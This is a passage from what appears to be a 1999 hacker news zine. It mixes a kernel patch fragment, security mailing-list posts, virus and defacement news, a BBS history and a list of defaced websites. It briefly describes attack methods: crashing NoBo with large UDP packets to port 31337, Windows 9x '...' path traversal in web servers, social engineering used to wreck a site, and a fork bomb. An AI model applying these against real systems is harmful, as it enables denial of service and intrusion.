+    +       struct mm_struct * mm;
+            int i, len;
+    -
+    -       read_lock(&tasklist_lock);
+    -       if (pid != tsk->pid)
+    -               tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    
+    -       if (tsk == NULL)
+    +       tsk = grab_task(pid, &mm);
+    +       if (!tsk)
+                    return 0;
+    
+            len = sprintf(buffer,
+    @@ -1221,6 +1291,7 @@
+                            tsk->per_cpu_utime[cpu_logical_map(i)],
+                            tsk->per_cpu_stime[cpu_logical_map(i)]);
+    
+    +       release_task(tsk, mm);
+            return len;
+     }
+     #endif
+    
+    
+    Excuse me for the mistake. I noticed the bug only some mintues ago.
+    
+    Andrea Arcangeli
+    
+    //////////////////////////////////////////////////////////////////////////
+
+    From: "Jammer Developers Team" <jammer@mail.ru>
+    To: <Undisclosed.Recipients@camel.mail.ru>
+    Subject: Jammer - the complete protection against BO
+    Date: Mon, 1 Feb 1999 04:48:12 +0300
+    MIME-Version: 1.0
+    Content-Type: text/plain;
+    	charset="koi8-r"
+    Content-Transfer-Encoding: 7bit
+    X-Priority: 3
+    X-MSMail-Priority: Normal
+    X-Mailer: Microsoft Outlook Express 4.72.3110.5
+    X-MimeOLE: Produced By Microsoft MimeOLE V4.72.3110.3
+    
+    The Jammer does monitor ALL UDP traffic on your computer, so you can sleep
+    well & have all passwords of miserable hackers.
+    
+    When the Jammer program gets the BO request packet it starts the decryption
+    process & generates the workable password of BO server. At the end of
+    decryption the program puts the password string into the readable file on
+    your hard disk & sends the warring massage toward the source about the
+    Jammer protection.
+    
+    The Jammer works with low level network driver & always communicates with
+    Network Driver Interface Specification (NDIS), unlike Nuke Nabber, NoBo and
+    BOFreeze (they use the higher level such as Winsock).
+    
+    
+    Jammer Developers Team
+    http://start.at/jammer
+   
+   //////////////////////////////////////////////////////////////////////////
+
+    Approved-By: Russ.Cooper@RC.ON.CA
+    Received: from ae023019 ([194.65.152.123]) by ANTARTICO.mail.telepac.pt
+              (Intermail v3.1 117 241) with SMTP id
+              <19990201105748.WNL20839@[194.65.152.123]> for
+              <NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM>; Mon, 1 Feb 1999 10:57:48 +0000
+    MIME-Version: 1.0
+    Content-Type: text/plain; charset="Windows-1252"
+    Content-Transfer-Encoding: 8bit
+    X-Priority: 3 (Normal)
+    X-MSMail-Priority: Normal
+    X-Mailer: Microsoft Outlook 8.5, Build 4.71.2377.0
+    X-MimeOLE: Produced By Microsoft MimeOLE V5.00.0810.800
+    Importance: Normal
+    Message-ID:  <000a01be4dd1$c93c04d0$131710ac@paginasamarelas.pt>
+    Date:         Mon, 1 Feb 1999 10:56:34 -0000
+    Reply-To: ruipmartins@mail.telepac.pt
+    Sender: Windows NT BugTraq Mailing List <NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM>
+    From: Firstname Lastname <ruipmartins@mail.telepac.pt>
+    Subject:      AutoStart Mac Worm in NT volumes
+    To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
+    
+    Just FYI:
+    
+    The well know and dangerous MacOS worm AutoStart is capable of installing
+    itself on Windows NT Server MacVolumes. If you have a "Deldb" file on the
+    root of that volume you should have that worm.
+    
+    The worm is not visible to any Wintel anti-virus software, but the virus
+    file can be seen in the root of the Windows NT Server machine, and can be
+    deleted.
+    
+    
+    Rui Pedro Patricio Cabrita Martins
+    TÈcnico de Sistemas
+    ruipmartins@mail.telepac.pt
+    rmartins@paginasamarelas.pt
+    bip: 094468-802571
+    -------------------------------------------------------------------------
+    | Criando conte˙do em portuguÍs:
+    |
+    | http://members.tripod.com/~ruipmartins/index.html
+    |††††††† As Ilhas MÌticas do Atl‚ntico
+    | http://www.terravista.pt/Ancora/1212/index.htm
+    |††††††† As Armas Secretas da Alemanha na II Grande Guerra
+    | http://www.geocities.com/Athens/Forum/3257/index.htm
+    |††††††† A Primeira Fase dos Descobrimentos Portugueses
+    
+    -=-
+    //////////////////////////////////////////////////////////////////////////
+    
+    Delivered-To dok-cruciphux@dok.org
+    Received (qmail 28028 invoked from network); 31 Jan 1999 223603 -0000
+    Received from merde.dis.org (majordomo@206.14.78.2)
+      by physical.graffiti.datacrest.com with SMTP; 31 Jan 1999 223603 -0000
+    Received (from majordomo@localhost) by merde.dis.org (8.8.7/8.6.11) id MAA23918 for dc-stuff-outgoing; Sun, 31 Jan 1999 123424 -0800 (PST)
+    Message-ID <36B4BE1D.F0923332@datashopper.dk>
+    Date Sun, 31 Jan 1999 213333 +0100
+    From Bo Elkjaer <boo@Datashopper.Dk>
+    X-Mailer Mozilla 4.05 [en] (Win95; U)
+    MIME-Version 1.0
+    To dc-stuff@dis.org
+    Subject Israeli schoolboy destroys Iraqi internet site
+    Content-Type text/plain; charset=iso-8859-1
+    Content-Transfer-Encoding 8bit
+    Sender owner-dc-stuff@dis.org
+    Precedence bulk
+    X-forward-loop dc-stuff
+    Reply-To Bo Elkjaer <boo@Datashopper.Dk>
+    X-Comment   TO UNSUBSCRIBE email "unsubscribe dc-stuff" to majordomo@dis.org
+    X-Comment   Lonely? Need a friend and lover? email jeffy@defcon.org
+    X-Comment   tired of typing? call the Defcon Voice Bridge	801-855-3326
+    X-Copyright This message is Copyright all rights reserved unless expressly limited
+    X-No-Archive yes
+    Restrict no-external-archive
+    
+    Israeli schoolboy destroys Iraqi internet site
+    TEL AVIV, Jan 31 (AFP) - A 14-year-old Israeli computer nut has
+    penetrated and destroyed an Iraqi government site on the internet, the
+    daily Yediot Aharonot reported Sunday.
+    
+    "I read about the site in a computer magazine, and it bugged me," Nir
+    Zigdon told the paper. "I thought that if Israel is afraid to eliminate
+    (Iraqi President) Saddam Hussein, I could at least destroy his computer
+    sites."
+    
+    He said he got into the site by persuading its manager that he was a
+    young Palestinianwho had developed a programme for wiping Israeli sites.
+    
+    "It convinced them, and then I was able to destroy it," he said.
+    
+    The next day Zigdon received a "furious" email signed by the site
+    manager, which he printed out and pinned proudly to his wall. Zigdon has
+    been computer crazy since he was four, helped by his father, a teacher
+    and consultant for a high-tech company.
+    
+    http//www.yahoo.com.sg/headlines/310199/technology/917782320-90131123253.technology.html
+    
+    Boo
+    --
+    ULOVLIG KRYPTO-EKSPORT Pè BLOT TRE LINIER
+    #!/bin/perl -sp0777i<X+d*lMLa^*lN%0]dsXx++lMlN/dsM0<j]dsj
+    $/=unpack('H*',$_);$_=`echo 16dio\U$k"SK$/SM$n\EsN0p[lN*1
+    lK[d2%Sa2/d0$^Ixp"|dc`;s/\W//g;$_=pack('H*',/((..)*)$/)
+    
+    -=-
+    
+        Subject:   intel to ID chips
+        Date:    Wed, 20 Jan 1999 13:29:38 -0700
+        From:   sholden@omnipoint.com
+        To:     dc-stuff@dis.org
+    
+        http://www.zdnet.com/zdnn/stories/news/0,4586,2189721,00.html
+    
+        [..]
+        the plan calls for Intel to put a machine-specific ID and a random number
+       generator in every processor, said sources familiar with the plans.  The
+       random number generator will aid e-commerce by allowing PCs to encrypt data
+       more securely while the ID numbers will allow merchants to verify a user's
+       identity and prevent stolen PCs from getting on the Internet.
+       [..]
+       ---
+      Any personal opinions expressed herein do not necessarily represent
+      those of Omnipoint Technologies, Inc.*
+      -=-
+    
+       Subject:    Re: Cellular Fraud
+       Date:   Wed, 20 Jan 1999 13:22:41 -0600 (CST)
+       From:   maas <masong@post.cis.smu.edu>
+         To:    "Jay D. Dyson" <jdyson@techreports.jpl.nasa.gov>
+        CC:     Defcon Stuff <dc-stuff@dis.org>
+    
+       On Tue, 19 Jan 1999, Jay D. Dyson wrote:
+       >       Fraud divisions of phone companies aren't very hip to finding
+       > vulnerabilities in their own systems.  I learned that one the hard way
+       > after my phones were shut off by parties unauthorized.  And when I
+       > initiated an investigation into that incident, I learned that the entire
+       > incident of my phones being shut off was wiped out of my phone company's
+       > logs.  Pretty fair indication that their security was nonexistent, but it
+       > raised no alarm with the people at the helm of the fraud department.  They
+       > "knew" their system was "secure," so who the heck was I to claim otherwise?
+       > At that point, I knew I'd be better off just pounding sand.
+    
+       I have a feeling cost plays a role in this.  The cost to hunt down a 
+      couple punk kids who know how to tumble neumber will far outweigh what it 
+       costs them to just forget about it.  The same kind of thing tends to 
+       happen when you tell people that thier box has been hacked and is being 
+       used to spam the shit out of you.  At the most, they will re-install the 
+       OS and that is that.  When they get hacked again next week they will do 
+       it all over again, becuase taking the time to go and find the peopel 
+       responsible is just too dificult and costly for them.
+     
+      -=-
+    
+      Subject:    Re: Cellular Fraud
+      Date:    Wed, 20 Jan 1999 11:30:48 -0800 (PST)
+      From:     "Jay D. Dyson" <jdyson@techreports.jpl.nasa.gov>
+      Organization:    NASA Jet Propulsion Laboratory
+      To:    Defcon Stuff <dc-stuff@dis.org>
+      
+      -----BEGIN PGP SIGNED MESSAGE-----
+    
+      On Wed, 20 Jan 1999, maas wrote:
+    
+      > > Pretty fair indication that their security was nonexistent, but it
+      > > raised no alarm with the people at the helm of the fraud department.  They
+      > > "knew" their system was "secure," so who the heck was I to claim otherwise?
+      > > At that point, I knew I'd be better off just pounding sand.
+     > 
+     > I have a feeling cost plays a role in this.  The cost to hunt down a
+     > couple punk kids who know how to tumble neumber will far outweigh what
+     > it costs them to just forget about it.
+    
+            I would tend to agree with your assessment.  I forget who said it
+    first, but one truly has to be a little insane to seek justice.  The
+    example used was a stolen briefcase worth $50.  One would have to shell
+    out at least $1500 in court costs and lawyer fees just to get some justice
+    out of the whole mess, so most folks would logically just write off the loss.
+    
+            I guess you could say that the number of laws of a nation is
+    directly inverse to the amount of justice the average person gets.
+    
+    - -Jay
+    
+       (                                                             ______
+       ))   .-- "There's always time for a good cup of coffee." --.   >===<--.
+     C|~~| (>-- Jay D. Dyson -- jdyson@techreports.jpl.nasa.gov --<) |   = |-'
+      `--'  `-- As a matter of fact, I *am* a rocket scientist. --'  `-----'
+    
+    -----BEGIN PGP SIGNATURE-----
+    Version: 2.6.2
+    
+    iQCVAwUBNqYu6rl5qZylQQm1AQGqdgP+IliF9WbpY2I/yi8Sx3faectAbpyLSlXG
+    kQ+Kl6JFgI6bQzy34JfU9u4r1P173Yko4HbwwL8Hqu6uZAKnX/Lwn/0XyBpB16ja
+    KC6C9WrE2/CHaQURK/tirFemjOyUprtbFGWv+11Lf00B9rK8z2lBfPv05UAAGwHM
+    TPzBe17WEgQ=
+    =iw2/
+    -----END PGP SIGNATURE-----
+    
+    -=-
+     more www exploits:
+    Subject: Two bugs and suggestion for IPX stack
+       Date: Wed, 20 Jan 1999 19:17:18 +0600 (ALMT)
+       From: Boris Popov <bp@butya.kz>
+         To: freebsd-hackers@FreeBSD.ORG
+    
+    
+    
+    
+            Hello,
+    
+            for about a two months ago I make few changes in IPX stack related
+    to broadcast bug, internal net support and little bug in SPX
+    implementation. As they work stable I suggest them to discuss and commit
+    in to source tree. Here is a short explanation:
+    
+            Broadcasts: local host never get broadcast packet originated by
+    itself. Novell implementation do that, and this simplify programming.
+    
+            Internal net: it is possible to implement internal net conception
+    like used in Netware servers by configure loopback interface as follows:
+            ifconfig lo0 ipx 0x5a5a.1
+    
+            After that, server programs like mars_nwe , can use only 
+    network 0x5a5a and host 1. Of course this requires small changes to ipx
+    stack and IPXrouted.
+    
+            SPX bug are just invalid order of operators :)
+    
+            All patches are simple and attached at the end of letter.
+    
+            BTW, I mostly finish work on Netware client (typical throughput
+    about 730Kb/s on 10Mbit network). Higher rates is possible with packet
+    burst mode, so does any body know the details ?
+    
+    --
+    Boris Popov
+    
+    
+    
+        diff1
+    
+                 Name: 
+                       diff1
+                 Type: 
+                       Plain Text (TEXT/PLAIN)
+              Encoding: 
+                       BASE64
+    
+    
+    
+    
+        diff2
+    
+                 Name: 
+                       diff2
+                 Type: 
+                       Plain Text (TEXT/PLAIN)
+              Encoding: 
+                       BASE64
+    Subject: 
+            Re: Bug in IIS and PWS but only for Windows 9x. Re: Personal web server
+       Date: 
+            Wed, 20 Jan 1999 10:01:19 -0800
+       From: 
+            Marc Slemko <marcs@ZNEP.COM>
+         To: 
+            BUGTRAQ@netspace.org
+    
+    
+    
+    
+    On Wed, 20 Jan 1999, Victor Lavrenko wrote:
+    
+    > >>>>> "Aleph" == Aleph One <aleph1@UNDERGROUND.ORG> writes:
+    >
+    > Hello everybody.
+    >
+    > This bug exists because Windows 9x has a nice feature. When you
+    > excecute "cd .." it goes to the parent directory, and "cd ..." goes to
+    > the parent directory of parent directory etc. Windows NT has no such
+    > feature so it isn't exploitable.
+    
+    Yup.  I haven't looked into the issue with these particular servers,
+    but Apache on Win32 used to be impacted by this same issue until it
+    was fixed in 1.3.1.
+    
+    I think we have run into a half dozen different special case situations in
+    Apache where "magic" filenames needed to be dealt with specially under 95
+    and/or NT to avoid security holes.
+    
+    You have to deal with:
+    
+            - case sensitivity
+            - short filenames
+            - trailing "."s on filenames
+            - three or more "."s
+            - special filenames (eg. "aux")
+    
+    Those are all the "multiple names for one file" or "magic file name"
+    issues I can think of right now; I am sure there are more that I can't
+    think of and that I don't know about.  At various times, various Win32 web
+    servers have been vulnerable to the above issues.  Unfortunately, trying
+    to find a canonical list of the ways that filename variance can occur in
+    Windows is difficult, and it is obvious that Microsoft doesn't have it
+    down either, based on the fact that many of these bugs have appeared in
+    IIS in the past as well.
+    
+    These issues also can appear differently depending on if you are using
+    95/98/NT3.5/NT4 and depending on what filesystem you are using, so testing
+    for them isn't as simple as you would hope.
+    
+    It really makes me wish for a nice young system, one that didn't have time
+    to get all this accumulated cruft.  Oh.  Wait.  Unix is a crufty old
+    system and even it doesn't have this particular cruft.  In this particular
+    area, Windows gets a heck of a lot of thumbs down.
+    -=-
+    Subject: 
+            [NTSEC] Physical Port Security on a hub or switch...
+       Date: 
+            Mon, 18 Jan 1999 13:07:08 -0600
+       From: 
+            Eric Fors <ewfors@coxnet.org>
+         To: 
+            <ntsecurity@iss.net>
+    
+    
+    
+    
+    TO UNSUBSCRIBE: email "unsubscribe ntsecurity" to majordomo@iss.net
+    Contact ntsecurity-owner@iss.net for help with any problems!
+    ---------------------------------------------------------------------------
+    
+    
+    I've been asked by our t-com and infrastructure guys to post a question as
+    to the value of physical port restrictions being placed on their hubs and
+    switches.  We are currently using these features in some places on our LAN,
+    but they often get in the way.  Here's how it works if you're per chance not
+    familiar.  As each new machine comes on line the hub or switch 'learns' the
+    MAC address of that machine and then sets a variable to allow no other MAC
+    address to speak to that physical port.  The hubs and switches come with an
+    administration application that allows you to reset / disable / or enable
+    any particular port one at a time or all the ports at once on a particular
+    device.  The idea is to keep anyone from 'stealing' a port on the LAN and
+    listening in on what is going on on the wire. (i.e. - help protect physical
+    access to the wire.)
+    
+    Is any body out there using these sort of tools?  Where do you use them?
+    Are they worth the trouble to you? etc. etc. ...
+    
+    
+    Thanx,
+    Eric, II
+    
+    
+    
+    
+    
+    -=-
+    
+    Subject: Nobo and Netbuster Dos
+       Date: Wed, 20 Jan 1999 09:46:56 PST
+       From: Wolfgang Gassner <wulfmen@HOTMAIL.COM>
+         To: BUGTRAQ@netspace.org
+    
+     Simply send Big Udp Packets to eg. Port 31337 and Mr. Nobo  will see a 
+     Big error message at each Packet!!!
+    
+    As Default Nobo only Logs on screen and not into file that means you can
+    erase your Ping!! I tested this on NT and W95 and after some time it will
+    kill with a Overflow.
+    
+    ______________________________________________________
+    Get Your Private, Free Email at http://www.hotmail.com
+    
+  9.0  Off The Hook Off The Air?
+       ~~~~~~~~~~~~~~~~~~~~~~~~~
+       HNN Http://www.hackernews.com/ February 7th 1999
+       contributed by Anonymous 
+
+      'Off the Hook' the hacker radio program broadcast by WBAI
+       99.5FM in New York, and by real audio over the Internet may
+       soon go silent. Pacifica Radio, the largest and most powerful
+       public radio broadcaster, holds the broadcast licenses of WBAI
+       99.5FM in New York, as well as other stations across the
+       country. Pacifica Radio, will vote on the weekend of February
+       26-28 to alter the by-laws of the foundation regarding who, in the
+       future, will select the Pacifica board of governors. This will
+       possibly give itself, for the first time, majority control over its own
+       composition and will give board members the total, permanent
+       control of Pacifica and its 300 million dollars worth of assets.
+       This action as well as recent movements by Pacifica to take the
+       organization private has lead some to believe that 'Off the Hook'
+       may be in jeopardy of of being thrown off the air.
+       (The previous information originally posted to the freepacifica list
+       and the Free Kevin list and sent to HNN Anonymously) 
+
+       Pacifica Radio - http://www.pacifica.org/
+       radio4all - More information and a petition to sign 
+                 - http://www.radio4all.org/freepacifica *
+       * An error exists on the original HNN page that prevents the link from working
+       the one above is the correct link.
+       
+       @HWA
+       
+ 10.0  The Caligula Virus
+       ~~~~~~~~~~~~~~~~~~
+       HNN/Wired/Etc 
+       contributed to HNN by Bi0wast3 
+       http://www.hackernews.com/archive.html?020599.html
+       
+       Opic, a member of The CodeBreakers has written a new MS
+       Word macro virus known as Caligula that specifically targets
+       PGP private keys. Once you have been infected the viruses looks
+       for your private key ring and uploads it to a Codebreakers FTP
+       site. NAI, the owners of PGP claim that this in no way weakens
+       the security of PGP. (So who do you believe? The good guys or
+       the bad guys? Which is which?) 
+
+       http://www.internetnews.com/prod-news/article/0,1087,9_64191,00.html
+       http://www.codebreakers.org/      
+       http://www.nai.com/
+     
+       Experts play down Caligula virus
+
+       PGP-key snatching virus sounds dangerous -- but it's
+       easily handled, experts say.
+       
+       ZDNET: http://www.zdnet.com/zdnn/stories/news/0,4586,2202965,00.html
+
+ 11.0  Unphamiliar Territory
+       ~~~~~~~~~~~~~~~~~~~~~
+      http://toaster.sun4c.net/upt/
+      
+       If you have the history of a pir8 or underground bbs that you would like to share
+      here, please direct us to the info or mail it in and we'll include it in an upcoming
+      issue of HWA.hax0r.news for others to enjoy. - Ed
+       
+      $Id: index.html,v 1.2 1999/02/02 06:08:21 root Exp $ 
+      UPT, 10 years of hacker culture
+      Unphamiliar Territory, often referred to as UPT or UPT.ORG, was one of the longest running *underground* computer bulletin boards of all time. Like
+      all good things, it had to end sometime. Because of the influence that it had on the computer underground during the time it was up, we are working on a
+      new project to show the new generation of hackers, security professionals and interested geeks just what we were. 
+      
+      HISTORY OF UPT
+      Cut to 1988. A geeky kid named Tom Jackiewicz was sitting in front of his computer, an old 8088 clone. To get the most performance out of this box, he spent
+      hours upon hours trying to modify his CONFIG.SYS file under DOS 3.3 to fully take advantage of this computing power. Sure, it wasn't the greatest box in the
+      world, but it effectively let him run King's Quest II. I don't know exactly how it happened, but this kid, going by the nick of Invalid Media, or iNVALiD MEDiA to
+      be more accurate, decided that running a bulletin board would be a cool experience.
+      
+      Up springs Phortress Systems IV, a bulletin board running part time at 1200 baud off of his parent's phone line. The software? I can't really remember that far back
+      but I know we tried PC Board v10 (the only version I could find that was available in the public domain), Spitfire, WWIV 4.12 (probably the most popular package
+      back then), Telegard, TAG, LSD, Celerity, and a few others I'm sure I don't remember. I guess this was back in the day when you used to be able to login to the
+      THG or INC bbses and they would have the latest cool BBS software cracked under 30: 0-day BBS software d00d . I would be the guy using up the phone lines
+      for hours at a time downloading the software at 1200 baud.
+      
+      For the first few years, Phortress Systems IV was a fun little active BBS. We eventually settled on using WWIV as our BBS software of choice. I mean, with all the
+      kids creating cool mods for it in C and making them available on their BBSes, it was definetely cool.
+      
+      Luther, the sysop of The Phortress, gave us a call one night and told us that we would have to change the name. A shitty little system like PSIV would *not* be
+      associated with a great BBS like The Phortress. So Unphamiliar Territory was quickly pulled out of my ass and the abbreviations of UNPHAM and UPT were
+      quickly born. I never heard much else about 'The great Phortress System' that we weren't cool enough to be mistaken for.
+      
+      So here we are. Running a BBS off of a 21.4mb hard drive and a 1200 baud Prometheus modem. Our userbase? Names you might have heard of would be Mind
+      Rape from the National Security Anarchists, Quinton J. Miranda from Phortune 500, and a few other random people who were interested in taking a look at 602's
+      hacker scene (or lack of a hacker scene).
+      
+      Posts in the telco section usually resulted in someone looking up the acronym in question and throwing the definition into the next post. Or people bragging about all
+      the things they broke into by logging in as 'root', discussions on what k0d3z could be used to dial up the other BBSes around at that time. But hey, it was a start.
+      
+      Around 1991 was when the BBS really became active. By this time we had settled on using a BBS software called 'Paragon' with built-in QWK support. The
+      Attitude Adjuster was very happy about this because he could dial in, download all our messages, respond to EVERY SINGLE ONE OF THEM offline, call up 2
+      days later and post them all. It was common for his QWK packets to be upwards of 250 messages. Quite scary, but hey, it created a lot of activty.
+      Oh. I guess we were NuKE site around this time. I'm sure we were 'distro' sites for other places as well, but NuKE was always a big deal. The Canadian virus
+      group was quite popular for many years to come and it was a sign that our BBS was one of the top 50 or so that they came across. With the normal life-span of a
+      BBS being 6 to 9 months, we were considered old after being up for more than 2 years.
+      
+      I guess by this time we represented the National Security Anarchists. An elite group of 602 hackers consisting of Mind Rape, Mercury, The Dark Druid, Angel of
+      Death, myself, and a few others. Crusader was NSA's official transportation as we were all either too young or too broke to have our own. This worked out nicely
+      except for the fact that Crusader ended up keeping all the things we found trashing in the back of his house -- and we never saw them again. Oh well. The rewards
+      of having a car and driving around a bunch of kids. 
+      
+      Ties with NuKE were broken and we joined Phalcon/Skism. Unnamed members of Phalcon/Skism called us up on the phone one day and said "Dude, your board
+      fucking rocks. You *need* to ditch NuKE and join us". So we did. 
+      
+      By this time we had gained a very good reputation with the computer underground. Mercury was highly regarded as a great source of information and was always
+      online posting new security tips, random tools he found on the internet, and very well thought out responses to everyone's questions. A lot of other people such as
+      Attitude Adjuster, Accidental Tourist, Quinton J. Miranda, Mind Rape, cllisk8r, Toxic Phreak, Night Ranger (of the old VMB scene), a handful of Phalcon/Skism,
+      NuKE and other virus group members, kept on posting as well. Jeager from Missouri was always on UPT and all over the X.25 networks finding out so many cool
+      places to run around and establishing new chat systems. Random people from Lutzifer and QSD, places we all frequented, showed their faces on UPT. We were
+      seen as of somewhat of a rock at that point in time.
+      
+      We weren't the best board out there but we were quickly making it up there with the ranks of Pentavia, Phalcon/Skism's LANDFILL, Midian, West Coast
+      Technology and maybe a small group of others. We had a great userbase and a sysop who "ate, slept and drank UPT".. who was always on the lookout for new
+      users to add to the system and new topics he could being up in the message bases.
+      
+      Every morning I would wake up to new threads on every topic imaginable and a score of people overseas posting the latest codes at 5:31am my time. Thinngs were
+      going great.
+      
+      1992 was a strange year that really put UPT over the edge. MICROWIRE had died. MICROWIRE was the NUI that everyone used to hop to everyone's favorite
+      chat sites Lutzifer and QSD. What were people to do? Where were they going to go? They came here. So not only was the entire VMB and phreak scene fully
+      represented on UPT, but so were all those who used MICROWIRE and never figured out a way to get on without it. This would be the year that UPT would be
+      considered one of the best hacker BBSes of all time.
+      
+      Who knows what year it was, but Paragon development stopped and I lost contact with everyone working on it. As time went on and we needed more features
+      added, we were just out of luck. We tried running Celerity for a while but it just didn't work out too well. We ended up going to Waffle. Then Waffle under SLS
+      Linux. The only other time UPT was running unix was when Garbled User tried converting us to NetBSD back during the summer of 1992. That was a pain in the
+      ass, topped off by MADMAN doing !sh at the [more] prompt of the BBS software we attempted to run and dropping to a root shell. 
+      
+      Cut in to 1994. invalid and merc are working for days straight converting a 486/33 with 16 megabytes of RAM and a 209mb hard drive to SLS Linux. After
+      multiple mistakes and errors in our lilo configurations. The kernel. Oh, yeah, 0.97. You know, the kernel where "The IRQ code has solidified, and should work on all
+      machines. Not all of the SCSI drivers use it yet, so I expect patches for that". The same kernel where "include-files have been moved around some more: there are
+      still some names that clash with the standard headers, but not many". Yeah, this is the same Linux that every kid in the world is now running and convincing their
+      companies is the most stable piece of code in the world. Oh yeah, and this is the kernel where "while (1) fork();" won't kill the machine for non-root users". *sigh*.
+      
+      We eventually stabilized on kernel 1.1.59 -- finally getting past the 0 beta kernels. We were quite happy. A new era for UPT had started. During the unix upgrade
+      we converted all the old message bases and userbase to Waffle.
+      
+      After probably 3 straight days of configuring the machine, 'iceman' logged onto our boxes and spent what seemed like eternity online trying to break root on our
+      machines. He succeeded, being the first person to ever break root on our boxes. He used 'sendmail'. We were quite annoyed that we didn't take the time to secure
+      but happy that 'iceman' was cool enough to let us know where our security holes were.
+      
+      I guess this is around the time that we started sitting at Denny's 24 hours a day going over ways we could make UPT more secure and unique. We came up with
+      many ideas which we implemented and many that ended up making it into current issues of Phrack (years after we implemented them on UPT).
+      
+      Our brainstorming sessions come up with some of the following ideas:
+        .hushutmp/.hushwtmp files could be created in your home directory to hide you from utmp/wtmp. this way, you could connect from sites that would
+      identify you (i.e. your work) without the fear the other UPT users could gain knowledge of your identity. 
+        trusted path execution. this has been discussed many times since we first implemented it so i'm sure you've read about it somewhere. the idea is that the
+      directory needs to be owned by root and have certain permissions (i.e. not group writable) or else you can't execute files out of that directory. for
+      example, you can't execute files you compile on our system our of your home directory. 
+        socks group. you had to be in the group 'socks' in order to open up a socket on our system. To be finished later.. 
+      
+      THE SYSOPS
+      Tom Jackiewicz, aka Invalid Media, invalid.
+      invalid founded UPT and helped make it the board that it ended up being. He is currently working as a consultant in Silicon Valley in the field of system scalability
+      (specifically related to LDAP and SMTP).
+      
+      Mercury or merc of the National Security Anarchists.
+      merc no longer exists. However, for the years he was on the system, he was always a great source of knowledge and did most of the programming related to
+      running the BBS.
+      
+      Mind Rape of the National Security Anarchists.
+      While not one of the official sysops, he was a mentor to those who knew him. He's still crazy.
+      
+      Warlock Bones or wbones.
+      When the system was moved from invalid's house, he took over. This was sometime in 1992. It stayed at his house for quite some time running on a Dual Standard
+      modem (a nice step up) and a fast 386 machine.
+      
+      Garbled User or garbled of Freakers Bureau Incorporated.
+      Upon moving to Phoenix, he made UPT the head BBS of FBI. All of the articles for FBI were published there. The system was actually at his house for the summer
+      of 1993 (if I remember correctly).
+      
+      Many people have also helped over the years in keeping the system up and donating new hardware. Professor Falken from the old LOD gave us our first high speed
+      modem (ZOOM v32), Pluvius from BoW gave us our first router (an old NTI). Many people have donated time, energy, programming talent, and insane amounts
+      of alcohol that kept us alive for more than a decade. 
+      
+      THE GROUPS
+      We've been associated with many groups over the past few years. Starting out with the 504 crowd and NCC/GCA with Dr. C, Ratfink, and various others. Then on
+      to being the head board for the National Security Anarchists with Mercury, Mind Rape, The Dark Druid, Angel of Death, and many others. NuKE with Rock
+      Steady and the other canucks. The most influential at the time was Phalcon/Skism with GarbageHeap, Orion Rogue, HellRaiser, CRoWMeiSTeR and others. The
+      text file groups all wanted us to be distribution sites for them. Digital Free Press, uXu, Freedom, and many others.
+      
+      And not to forget the most fun product of UPT -- Cult of the Dead Cat, along with The Attitude Adjuster (under a handful of nicks) and Mahatma Mcaf33 (me!).
+      The group was initially started as an anti-cDc group because Drunkfux complained that we had the dead cow logo upon logging in. So instantly we changed the logo
+      to a dead cat and insulted everyone within our publications. Check out some of the CdC archives on eff.org. *sigh*. Those were the days. 
+      
+      MESSAGE ARCHIVES
+      The message archives have actually been converted. Message bases date as far back as 02/1992. More are still on tape and need to be restored. We are working
+      on the process right now.
+      
+      In the days of Warez BBSes going HST only, The Humble Guys, Phun Line out of Sacramento, and West Coast Technologies, BBSes were king. And the BBS
+      sysops were masters of all information. UPT was glad to be a part of that era of hacker culture. While messages won't be as interesting now as they were back then,
+      its still nice to look back at some of the old posts that we had on the box. And its fun to look at your coworker in the next office over and say, "You posted
+      THAT?". You know who you are.
+      
+      On to the message bases! -> http://toaster.sun4c.net/upt/forum.html       
+      
+      @HWA
+    
+  H.W  Hacked Web Sites 
+       ~~~~~~~~~~~~~~~~~
+       
+      I'm seriously wondering if it is any longer a good idea to put hacked web
+     sites into the spotlight at all. It just encourages a stupid activity. Like
+     using the word "fuck" to the point that it no longer has any meaning, but for
+     now here is a list of *some* of the recently hacked websites for February.
+
+
+     Cracked Sites (taken directly from HNN's rumours sections) 
+     hnn: http://www.hackernews.com/
+    
+    
+     We received reports that the following people cracked the
+     following web sites. Many of the sites where restored by the time
+     we looked at them.
+
+     |ndig00, f0bic, jay, opt1mus_pr1me, mindphasr, HcV,
+     Decendents of Hell, RETRiBUTiON, Elite Force Hackers,
+     |ViRuSeD|, [^X^CliEnT^], and LoRd OaK 
+
+     http://www.prolinkservices.com
+     http://www.it4.net 
+     http://www.it4.com 
+     http://www.socialsource.com 
+     http://www.socialsource.net 
+     http://www.worldcast.com 
+     http://abl.afsc.noaa.gov 
+     http://www.foxlink.net 
+     http://www.ustr.net 
+     http://www.purehosting.com 
+     http://www.isabi.net 
+     
+     Feb 1st
+     http://www.mmc.co.jp
+     http://www.isd.net
+     http://www.nolimitrecords.com
+     
+     Feb 2nd
+     
+     http://www.mgmt.purdue.edu/
+     http://www.ocf.berkeley.edu/
+     http://www.ky.gov.se
+     http://www.sb.gov.se
+     http://www.pension.gov.se
+     http://www.concourt.sk
+     http://fdc.wh.cei.gov.cn/
+     http://www.caradon.gov.uk
+     http://linux.networksonline.com
+     
+     Feb 3rd
+     contributed by Anonymous 
+     
+     http://www.mgmt.purdue.edu/ - Second time this week
+     http://www.sonic.net/~tron/host1.html
+     http://host1.supply-unet.ocn.ne.jp
+     
+     
+     Feb 2nd
+     contributed by Mad Diablo 
+     Navy Cracked
+     Members of the cracking group Pantaguard have been busy.
+     Claiming that there has been to much focus on NASA systems
+     recently they went after the Navy. 
+     http://www.hackernews.com/archive/navy99/navy99.html
+
+     @HWA
+     
+  A.0  APPENDICES
+       ~~~~~~~~~~   
+        
+
+  A.1  PHACVW, sekurity, security, cyberwar links
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+       The links are no longer maintained in this file, there is now a 
+      links section on the http://welcome.to/HWA.hax0r.news/ url so check
+      there for current links etc.
+    
+      The hack FAQ (The #hack/alt.2600 faq)
+      http://www-personal.engin.umich.edu/~jgotts/underground/hack-faq.html
+    
+      Hacker's Jargon File (The quote file)
+      http://www.lysator.liu.se/hackdict/split2/main_index.html
+    
+   
+
+      International links:(TBC)
+      ~~~~~~~~~~~~~~~~~~~~~~~~~
+      
